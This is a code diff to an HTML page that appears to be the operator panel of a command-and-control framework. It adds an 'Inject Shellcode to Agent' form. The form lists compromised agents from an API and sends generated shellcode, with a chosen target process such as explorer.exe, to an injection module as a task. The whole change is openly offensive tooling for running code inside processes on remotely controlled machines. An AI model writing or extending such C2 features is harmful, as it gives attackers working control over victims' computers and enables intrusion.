@@ -182,6 +182,19 @@
         <button onclick="generateShellcode()">Generate Shellcode</button>
 
         <div id="result"></div>
+
+        <!-- Inject Shellcode to Agent UI -->
+        <div id="injectForm" style="margin-top:20px; display:none;">
+            <h3>Inject Shellcode to Agent</h3>
+            <form id="injectShellcodeForm">
+                <label for="agent_id">Agent:</label>
+                <select id="agent_id"></select>
+                <label for="process">Target Process:</label>
+                <input type="text" id="process" placeholder="e.g. explorer.exe" required>
+                <button type="submit">Send to Agent</button>
+            </form>
+            <div id="injectResult"></div>
+        </div>
     </div>
 
     <script>
@@ -262,6 +275,7 @@
                 
                 if (result.success) {
                     document.getElementById('result').textContent = result.shellcode;
+                    showInjectForm();
                 } else {
                     document.getElementById('result').textContent = `Error: ${result.error}`;
                 }
@@ -273,6 +287,42 @@
         // Initialize form
         updateForm();
         toggleKey();
+
+        function showInjectForm() {
+            document.getElementById('injectForm').style.display = 'block';
+            loadAgents();
+        }
+
+        async function loadAgents() {
+            const res = await fetch('/api/agents');
+            const data = await res.json();
+            const sel = document.getElementById('agent_id');
+            sel.innerHTML = '';
+            (data.agents || data).forEach(agent => {
+                const opt = document.createElement('option');
+                opt.value = agent.agent_id || agent.id;
+                opt.textContent = agent.agent_id || agent.id;
+                sel.appendChild(opt);
+            });
+        }
+
+        document.getElementById('injectShellcodeForm').onsubmit = async function(e) {
+            e.preventDefault();
+            const agent_id = document.getElementById('agent_id').value;
+            const process = document.getElementById('process').value;
+            const shellcode = document.getElementById('result').innerText.trim();
+            const res = await fetch('/api/tasks', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    agent_id,
+                    module: 'modules.shellcode.inject',
+                    params: { process, shellcode }
+                })
+            });
+            const result = await res.json();
+            document.getElementById('injectResult').innerText = result.status === 'success' ? 'Task sent!' : ('Error: ' + (result.error || result.message));
+        };
     </script>
 </body>
 </html>
